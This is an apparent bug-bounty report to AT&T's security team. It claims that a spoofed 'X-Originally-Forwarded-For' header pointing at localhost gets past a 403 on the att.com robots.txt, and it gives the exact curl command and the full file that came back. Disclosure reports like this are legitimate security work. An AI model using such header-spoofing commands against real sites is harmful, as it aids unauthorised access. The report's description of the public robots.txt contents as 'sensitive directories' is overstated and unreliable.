@@ -1,0 +1,395 @@
+
+Bypass front server restrictions and access to forbidden files and directories through 'X-Originally-Forwarded-For header on https://www.att.com
+
+
+Hello Security Team,
+
+
+I managed to bypass 403 forbidden file in https://www.att.com
+
+## Reproduce :-
+
+1) Click https://www.att.com/robots.txt ( Forbidden file :- robots.txt). If you click you will redirect to 403 "forbidden" page :-
+
+Access Denied
+You don't have permission to access "http://www.att.com/robots.txt" on this server.
+
+Reference #18.a4d01702.1729425070.1033cfe
+
+https://errors.edgesuite.net/18.a4d01702.1729425070.1033cfe
+
+## Request :-
+
+'GET /robots.txt HTTP/2
+Host: www.att.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: none
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers'
+
+
+## Response :-
+
+'HTTP/2 403 Forbidden
+Server: AkamaiGHost
+Mime-Version: 1.0
+Content-Type: text/html
+Content-Length: 377
+Expires: Sun, 20 Oct 2024 12:00:44 GMT
+Date: Sun, 20 Oct 2024 12:00:44 GMT
+Server-Timing: cdn-cache; desc=HIT
+Server-Timing: edge; dur=1
+Aka-Global-Request-Id-Uxtime: 0.a4d01702.1729425643.108d7ee
+Strict-Transport-Security: max-age=15768000 ; preload
+Server-Timing: ak_p; desc="1729425643846_35115172_17356782_39_69541_92_105_15";dur=1
+
+<HTML><HEAD>
+<TITLE>Access Denied</TITLE>
+</HEAD><BODY>
+<H1>Access Denied</H1>
+ 
+You don't have permission to access "http&#58;&#47;&#47;www&#46;att&#46;com&#47;robots&#46;txt" on this server.<P>
+Reference&#32;&#35;18&#46;a4d01702&#46;1729425643&#46;108d7ee
+<P>https&#58;&#47;&#47;errors&#46;edgesuite&#46;net&#47;18&#46;a4d01702&#46;1729425643&#46;108d7ee</P>
+</BODY>
+</HTML>'
+
+
+
+2) But you can bypass this.
+
+3) type this command :- curl -ks -H 'X-Originally-Forwarded-For: 127.0.0.1, 68.180.194.242' -X GET 'https://www.att.com/robots.txt' -H 'User-Agent: Mozilla/5.0'
+
+
+## Proof-of-Concept :-
+
+Exploited command :- curl -ks -H 'X-Originally-Forwarded-For: 127.0.0.1, 68.180.194.242' -X GET 'https://www.att.com/robots.txt' -H 'User-Agent: Mozilla/5.0'
+
+Result :- 403 bypassed and access sensitive directories inside the robots.txt :-
+
+
+# Bad Robots!
+User-agent: DotBot
+Disallow: /
+
+User-agent: dotbot
+Disallow: /
+
+User-agent: *
+# jl022q edits 05.01.24 - start
+Disallow: /search/
+Disallow: /cfd/
+Disallow: *bvstate=pg*
+Disallow: */rest/clicktrack?*
+Disallow: */rest/getlist?*
+Disallow: /buy/postpaid/line-selection
+Disallow: /ssaf/ssafc/
+Disallow: */msapi/*
+Disallow: /att-dgt-checkin-e/api/*
+Disallow: */sdattservicesinc/*
+Disallow: https://pre-www.att.com/home-phone/lifeline/
+# jl022q edits 05.01.24 - end
+
+# jl022q edits 09.27.24 - start
+Disallow: /buy/phones/find/*
+Disallow: /buy/tablets/find/*
+Disallow: /buy/accessories/find/*
+Disallow: /buy/wearables/find/*
+Disallow: /buy/prepaid-phones/find/*
+Disallow: /buy/connected-devices-and-more/find/*
+Disallow: /es-us/buy/phones/find/*
+Disallow: /es-us/buy/tablets/find/*
+Disallow: /es-us/buy/accessories/find/*
+Disallow: /es-us/buy/wearables/find/*
+Disallow: /es-us/buy/prepaid-phones/find/*
+Disallow: /es-us/buy/connected-devices-and-more/find/*
+# jl022q edits 09.27.24 - end
+
+Disallow: /gtm/
+# Consumer Wireless and Home
+Disallow: /support/showarticle*
+Disallow: /contactus/*
+Disallow: /esupport/index.html*
+Disallow: /esupport/index.jsp*
+Disallow: /esupport/article.html*
+Disallow: /esupport/article.jsp*
+Disallow: /esupport/main.html*
+Disallow: /esupport/main.jsp*
+Disallow: /esupport/u-verse-tv-troubleshooting/*
+Disallow: /esupport/billAndAccount.jsp*
+Disallow: /esupport/security.jsp*
+Disallow: /esupport/postmaster*
+Disallow: /esupport/online-services.jsp*
+Disallow: /esupport/smbindex.jsp*
+Disallow: /esupport/report-call-or-text.html*
+Disallow: /esupport/speed-calculator*
+Disallow: /esupport/data-calculator*
+Disallow: /OLAM_PROD_CMS/*
+Disallow: /*EDOCSSESSIONID*
+Disallow: /*SESSIONID*
+Disallow: /*es-us/esupport/article.jsp?pagebody*
+Disallow: /*es/legalterms.html
+Disallow: /*rex/recommendation/*
+Disallow: /Common/maintenance/maintenance.html
+Disallow: /Common/popup/
+Disallow: /Common/supern/
+Disallow: /Large-Files/
+Disallow: /apis/maps/v2/locator/search/query.json
+Disallow: /apis/maps/v2/locator/search/viewport.json
+Disallow: /billinserts/
+Disallow: /dsl/modals/
+Disallow: /dsl/shop/fragments/
+Disallow: /buy/broadband
+Disallow: /buy/directv
+Disallow: /buy/cart
+Disallow: /buy/wireless/
+Disallow: /buy/wireless/devices
+Disallow: /buy/byod/
+Disallow: /buy/byod/sim-selection/
+Disallow: /buy/bundles
+Disallow: /esupport/ref/showarticle.jsp*
+Disallow: /esupport/sender/
+Disallow: /esupport/sender/browseResults.jsp
+Disallow: /esupport/solutionDisplay.jsp
+Disallow: /gen/press-room?pid=19457&cdvn=news&newsarticleid=31735
+Disallow: /maintenance/maintenance.html
+Disallow: /maps/not-available.html
+Disallow: /privacy/policy/
+Disallow: /global-search/search*
+Disallow: /mktg/
+Allow: /mktg/v1/_next/
+Disallow: /olam/passthroughAction.myworld*
+Disallow: /olam/loginAction.olamexecute
+Disallow: /olam/IdentityFailureAction.olamexecute*
+Disallow: /olam/validateAccountForgotIdSlid.myworld
+Disallow: /olam/jsp/login/inProgress.jsp*
+# Small Business
+Disallow: /smallbusiness/404.jsp?
+Disallow: /smallbusiness/b?
+Disallow: /smallbusiness/search
+Disallow: /smallbusiness/wireless/buyFlowContainer.jsp
+Disallow: /smallbusiness/i9nvalidParamInput.jsp
+Disallow: /es-us/OLAM_PROD_CMS/*
+Disallow: /es-us/*EDOCSSESSIONID*
+Disallow: /es-us/*SESSIONID*
+Disallow: /es-us/*es-us/esupport/article.jsp?pagebody*
+Disallow: /es-us/*es/legalterms.html
+Disallow: /es-us/*rex/recommendation/*
+Disallow: /es-us/Common/maintenance/maintenance.html
+Disallow: /es-us/Common/popup/
+Disallow: /es-us/Common/supern/
+Disallow: /es-us/Large-Files/
+Disallow: /es-us/apis/maps/v2/locator/search/query.json
+Disallow: /es-us/apis/maps/v2/locator/search/viewport.json
+Disallow: /es-us/billinserts/
+Disallow: /es-us/dsl/modals/
+Disallow: /es-us/dsl/shop/fragments/
+Disallow: /es-us/buy/broadband
+Disallow: /es-us/buy/directv
+Disallow: /es-us/buy/bundles
+Allow: /es-us/buy/bundles?product_suite=NBB
+Disallow: /es-us/buy/cart
+Disallow: /es-us/esupport/ref/showarticle.jsp*
+Disallow: /es-us/esupport/sender/
+Disallow: /es-us/esupport/sender/browseResults.jsp
+Disallow: /es-us/esupport/solutionDisplay.jsp
+Disallow: /es-us/gen/press-room?pid=19457&cdvn=news&newsarticleid=31735
+Disallow: /es-us/maintenance/maintenance.html
+Disallow: /es-us/maps/not-available.html
+Disallow: /es-us/privacy/policy/
+Disallow: /es-us/global-search/search*
+Disallow: /es-us/mktg/
+Allow: /es-us/mktg/v1/_next/
+Disallow: /es-us/olam/passthroughAction.myworld*
+Disallow: /es-us/olam/loginAction.olamexecute
+Disallow: /es-us/olam/IdentityFailureAction.olamexecute*
+Disallow: /es-us/olam/validateAccountForgotIdSlid.myworld
+Disallow: /es-us/olam/jsp/login/inProgress.jsp*
+# Small Business
+Disallow: /es-us/smallbusiness/404.jsp?
+Disallow: /es-us/smallbusiness/b?
+Disallow: /es-us/smallbusiness/search
+Disallow: /es-us/smallbusiness/wireless/buyFlowContainer.jsp
+Disallow: /es-us/smallbusiness/i9nvalidParamInput.jsp
+
+User-agent: Googlebot
+Disallow: /gtm/
+Disallow: https://pre-www.att.com/home-phone/lifeline/
+
+# jl022q edits 05.01.24 - start
+Disallow: /search/
+Disallow: /cfd/
+Disallow: *bvstate=pg*
+Disallow: */rest/clicktrack?*
+Disallow: */rest/getlist?*
+Disallow: /buy/postpaid/line-selection
+Disallow: /ssaf/ssafc/
+Disallow: */msapi/*
+Disallow: */sdattservicesinc/*
+# jl022q edits 05.01.24 - end
+
+# jl022q edits 09.27.24 - start
+Disallow: /buy/phones/find/*
+Disallow: /buy/tablets/find/*
+Disallow: /buy/accessories/find/*
+Disallow: /buy/wearables/find/*
+Disallow: /buy/prepaid-phones/find/*
+Disallow: /buy/connected-devices-and-more/find/*
+Disallow: /es-us/buy/phones/find/*
+Disallow: /es-us/buy/tablets/find/*
+Disallow: /es-us/buy/accessories/find/*
+Disallow: /es-us/buy/wearables/find/*
+Disallow: /es-us/buy/prepaid-phones/find/*
+Disallow: /es-us/buy/connected-devices-and-more/find/*
+# jl022q edits 09.27.24 - end
+
+# Consumer Wireless and Home
+Disallow: /support/showarticle*
+Disallow: /contactus/*
+Disallow: /esupport/index.html*
+Disallow: /esupport/index.jsp*
+Disallow: /esupport/article.html*
+Disallow: /esupport/article.jsp*
+Disallow: /esupport/main.html*
+Disallow: /esupport/main.jsp*
+Disallow: /esupport/u-verse-tv-troubleshooting/*
+Disallow: /esupport/billAndAccount.jsp*
+Disallow: /esupport/security.jsp*
+Disallow: /esupport/postmaster*
+Disallow: /esupport/online-services.jsp*
+Disallow: /esupport/smbindex.jsp*
+Disallow: /esupport/report-call-or-text.html*
+Disallow: /esupport/speed-calculator*
+Disallow: /esupport/data-calculator*
+Disallow: /OLAM_PROD_CMS/*
+Disallow: /*EDOCSSESSIONID*
+Disallow: /*SESSIONID*
+Disallow: /*es-us/esupport/article.jsp?pagebody*
+Disallow: /*es/legalterms.html
+Disallow: /*rex/recommendation/*
+Disallow: /Common/maintenance/maintenance.html
+Disallow: /Common/popup/
+Disallow: /Common/supern/
+Disallow: /Large-Files/
+Disallow: /apis/maps/v2/locator/search/query.json
+Disallow: /apis/maps/v2/locator/search/viewport.json
+Disallow: /billinserts/
+Disallow: /dsl/modals/
+Disallow: /dsl/shop/fragments/
+Disallow: /buy/broadband
+Disallow: /buy/directv
+Disallow: /buy/cart
+Disallow: /buy/wireless/
+Disallow: /buy/wireless/devices
+Disallow: /buy/byod/
+Disallow: /buy/byod/sim-selection/
+Disallow: /buy/bundles
+Disallow: /esupport/ref/showarticle.jsp*
+Disallow: /esupport/sender/
+Disallow: /esupport/sender/browseResults.jsp
+Disallow: /esupport/solutionDisplay.jsp
+Disallow: /gen/press-room?pid=19457&cdvn=news&newsarticleid=31735
+Disallow: /maintenance/maintenance.html
+Disallow: /maps/not-available.html
+Disallow: /privacy/policy/
+Disallow: /global-search/search*
+Disallow: /mktg/
+Allow: /mktg/v1/_next/
+Disallow: /olam/passthroughAction.myworld*
+Disallow: /olam/loginAction.olamexecute
+Disallow: /olam/IdentityFailureAction.olamexecute*
+Disallow: /olam/validateAccountForgotIdSlid.myworld
+Disallow: /olam/jsp/login/inProgress.jsp*
+# Small Business
+Disallow: /smallbusiness/404.jsp?
+Disallow: /smallbusiness/b?
+Disallow: /smallbusiness/search
+Disallow: /smallbusiness/wireless/buyFlowContainer.jsp
+Disallow: /smallbusiness/i9nvalidParamInput.jsp
+Disallow: /es-us/OLAM_PROD_CMS/*
+Disallow: /es-us/*EDOCSSESSIONID*
+Disallow: /es-us/*SESSIONID*
+Disallow: /es-us/*es-us/esupport/article.jsp?pagebody*
+Disallow: /es-us/*es/legalterms.html
+Disallow: /es-us/*rex/recommendation/*
+Disallow: /es-us/Common/maintenance/maintenance.html
+Disallow: /es-us/Common/popup/
+Disallow: /es-us/Common/supern/
+Disallow: /es-us/Large-Files/
+Disallow: /es-us/apis/maps/v2/locator/search/query.json
+Disallow: /es-us/apis/maps/v2/locator/search/viewport.json
+Disallow: /es-us/billinserts/
+Disallow: /es-us/dsl/modals/
+Disallow: /es-us/dsl/shop/fragments/
+Disallow: /es-us/buy/broadband
+Disallow: /es-us/buy/directv
+Disallow: /es-us/buy/bundles
+Allow: /es-us/buy/bundles?product_suite=NBB
+Disallow: /es-us/buy/cart
+Disallow: /es-us/esupport/ref/showarticle.jsp*
+Disallow: /es-us/esupport/sender/
+Disallow: /es-us/esupport/sender/browseResults.jsp
+Disallow: /es-us/esupport/solutionDisplay.jsp
+Disallow: /es-us/gen/press-room?pid=19457&cdvn=news&newsarticleid=31735
+Disallow: /es-us/maintenance/maintenance.html
+Disallow: /es-us/maps/not-available.html
+Disallow: /es-us/privacy/policy/
+Disallow: /es-us/global-search/search*
+Disallow: /es-us/mktg/
+Allow: /es-us/mktg/v1/_next/
+Disallow: /es-us/olam/passthroughAction.myworld*
+Disallow: /es-us/olam/loginAction.olamexecute
+Disallow: /es-us/olam/IdentityFailureAction.olamexecute*
+Disallow: /es-us/olam/validateAccountForgotIdSlid.myworld
+Disallow: /es-us/olam/jsp/login/inProgress.jsp*
+# Small Business
+Disallow: /es-us/smallbusiness/404.jsp?
+Disallow: /es-us/smallbusiness/b?
+Disallow: /es-us/smallbusiness/search
+Disallow: /es-us/smallbusiness/wireless/buyFlowContainer.jsp
+Disallow: /es-us/smallbusiness/i9nvalidParamInput.jsp
+
+#  PROD-34469
+Disallow: /u-verse/availability/pending-order.jsp
+Disallow: /u-verse/availability/check-customer-type.jsp
+
+#  PROD-34470
+Disallow: /shop/unified/availability.html?destination_page=BYOB
+Disallow: /shop/unified/availability/results.html
+Disallow: /shop/unified/availability/calltoorder.html
+
+# AKA-6232
+Disallow: /myorders/*
+Disallow: /acctmgmt/*
+
+# Sitemap Index
+Sitemap: https://www.att.com/sitemap.xml
+
+# Previous Update 8/14/2023 by ds3808
+# Last Update 5.1.2024 by jl022q
+
+
+
+
+## Note :-
+
+ Also if any important files and directories are used within the site and maintained in the same way, it may be possible to bypass them with the same techniques.
+
+
+
+## Impact :-
+
+- https://www.att.com/robots.txt 403 bypass and access sensitive directories inside the robots.txt
+- Attacker can bypass forbidden 403 pages.
+
+## Simolar reports :-
+
+- https://hackerone.com/reports/737323
+- https://hackerone.com/reports/1011767
